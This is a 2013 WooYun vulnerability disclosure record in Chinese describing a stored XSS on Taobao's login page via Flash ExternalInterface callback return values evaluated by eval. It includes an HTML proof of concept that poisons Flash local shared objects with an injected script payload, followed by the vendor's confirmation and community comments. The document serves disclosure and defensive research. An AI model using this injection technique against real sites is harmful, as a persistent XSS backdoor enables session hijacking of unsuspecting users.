{"id": 8016, "wybug_id": "wooyun-2013-039481", "wybug_title": "一个flash的0day导致的淘宝网存储xss(可形成永久后门)", "wybug_corp": "淘宝网", "wybug_author": "neobyte", "wybug_date": "2013-10-12 13:00", "wybug_open_date": "2013-11-26 13:01", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "利用技巧", "应用安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-11-26：\t细节向公众公开  简要描述： 淘宝的存储XSS,其实是利用了flash的0day,但预计很多网站都受影响... 详细说明：  关于flash的XSS,除了常见的一些技巧外,目前已知的比较偏门的两类是:1.ExternalInterface.call的第二个参数,主要利用\\\",catch(e){}//,wooyun上有很多例子2.在IE下,当flash调用ExternalInterface.addCallback时,如果object的id可控.但需要注意的是:当js调用flash暴露出来的callback时,返回值也是一个敏感点!这个在wooyun上并没有看到有人提及,也许被很多人忽视了.首先来看看js是如何处理flash的callback的:1.在ie下,其实是\neval(instance.CallFunction(\"<invoke name=\\\"\"+name+\"\\\" returntype=\\\"javascript\\\">\" + __flash__argumentsToXML(arguments,0) + \"</invoke>\"));\n2.在FF与Chrome等其他浏览器下,其实是\neval(var __flash_temp = \"returned value\"; __flash_temp;)\n注意到这里都调用了eval,再结合ExternalInterface.call的那个0 day, 利用方式也就呼之欲出了. 所以只要js中调用了callback函数,而返回值又可被攻击者控制的话,就可以造成xss. IE, Chrome, FF等浏览器均受影响.一般的,如果你利用js来读取flash的LSO的话,那么就很有可能中招. 注意不管你是否在js里是否对过滤读取出的数据,也不管你读取出数据后是否用于DOM操作,仅仅读取这个动作就会触发XSS.实例:https://login.taobao.com这个页面自动加载一个JSocket.swf,这个flash会添加二个callback函数,分别是getlso与setlso.如果用户访问某个恶意站点的过程中其LSO被篡改,那么当其以后访问login.taobao.com时就触发xss. 由于LSO是持久的,所以利用这个xss劫持用户也是可能的.下面是POC(渣代码见谅),访问这个html后再访问login.taobao.com就会触发XSS\n<html><body><object id=\"JSocket\" tabindex=\"-1\" classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" width=\"1\" height=\"1\" codebase=\"http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab\">       <param name=\"movie\" value=\"http://acjstb.aliyun.com/actionlog/flash/JSocket.swf\">       <param name=\"allowScriptAccess\" value=\"always\">       <embed name=\"JSocket\" src=\"http://acjstb.aliyun.com/actionlog/flash/JSocket.swf\" width=\"1\" height=\"1\" allowscriptaccess=\"always\" type=\"application/x-shockwave-flash\" pluginspage=\"http://www.adobe.com/go/getflashplayer\"></object><script>function set(){document['JSocket'].setlso('aa\\\\\";alert(document.domain);//aa');}setTimeout(\"set()\",5000);</script></body></html>\n   漏洞证明：  1. Chrome下\n\n2. IE下,顺便验证一下domain\n\n   修复方案：  怎么检查ExternalInterface.call的输入参数,就怎么处理callback的返回值吧   版权声明：转载请注明来源 neobyte@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2013-10-12 16:44 厂商回复： 感谢你对我们的支持与关注，该问题我们正在修复~~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-12 13:05 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  我去，这才是漏洞。高端大气上档次，低调奢华有内涵。    \n     2013-10-12 13:21 |    \t\t灬相随灬 \t\t\t( 普通白帽子  |\t\t\t        Rank:369 漏洞数:68        | 大胆天下去得，小心寸步难行。)\t\t \n  忽略    \n     2013-10-12 13:36 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  mark    \n     2013-10-12 13:41 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  0day都出来了    \n     2013-10-12 13:45 |    \t\txxw \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:18        | 中国梦)\t\t \n  牛逼    \n     2013-10-12 13:49 |    \t\tMr.杨总 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | 绿色 无毒  你懂得。。。。心要宽 。。。)\t\t \n  高端大气上档次，低调奢华有内涵。    \n     2013-10-12 13:51 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  mark    \n     2013-10-12 14:05 |    \t\t暖暖 \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:2        | 屌丝一个。)\t\t \n  淘宝的存储XSS,其实是利用了flash的0day,但预计很多网站都受影响...厂商忽略。    \n     2013-10-12 14:15 |    \t\t想要减肥的胖纸 \t\t\t( 普通白帽子  |\t\t\t        Rank:250 漏洞数:42        )\t\t \n  漏洞名字高端大气上档次，低调社会有内涵    \n     2013-10-12 14:15 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  私信 求细节！    \n     2013-10-12 14:18 |    \t\txxw \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:18        | 中国梦)\t\t \n  这是要火的节奏丫！    \n     2013-10-12 14:33 |    \t\tonlycjeg \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:5        | 我就看看,我不说话.)\t\t \n  mark    \n     2013-10-12 14:42 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  关注下    \n     2013-10-12 15:29 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  马克    \n     2013-10-12 15:52 |    \t\ttxcbg \t\t\t( 普通白帽子  |\t\t\t        Rank:391 漏洞数:53        | 说点什么呢？)\t\t \n  关注    \n     2013-10-12 16:19 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  闪电    \n     2013-10-12 16:39 |    \t\t╰╃清風 \t\t\t( 实习白帽子  |\t\t\t        Rank:89 漏洞数:9        | 这家伙很懒，什么都没有留下)\t\t \n  高端大气上档次    \n     2013-10-13 11:11 |    \t\tX防部 \t\t\t( 普通白帽子  |\t\t\t        Rank:487 漏洞数:137        )\t\t \n  骚年公开吧    \n     2013-10-22 19:11 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  我看了 高端大气上档次 建议淘宝送给洞主一只吉娃娃    \n     2013-10-24 01:54 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  问题很隐蔽，这个开发人员肯定注意不到了，只要有这么用了的，估计都存在问题。    \n     2013-10-24 09:15 |    \t\tclzzy \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:18        )\t\t \n  mark    \n     2013-10-24 12:51 |    \t\tX防部 \t\t\t( 普通白帽子  |\t\t\t        Rank:487 漏洞数:137        )\t\t \n  尼玛 花了4个wb提前看 真值！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！    \n     2013-10-24 13:21 |    \t\tNULL0 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:3        | ..............)\t\t \n  尼玛 花了4个wb提前看 真值！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！    \n     2013-11-04 11:43 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  这个给力，感觉8rank少了，不过仅对淘宝来说，差不多~其实是个通用漏洞啊~    \n     2014-03-10 10:05 |    \t\ther0ma \t\t\t( 核心白帽子 |\t\t\t        Rank:598 漏洞数:84        | 专注小厂商三十年！)\t\t \n  将allowscriptaccess的属性值修改成sameDomain 是不是会防止？    \n     2014-05-21 14:16 |    \t\t小贱人 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 资深菜鸟，)\t\t \n  mark    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}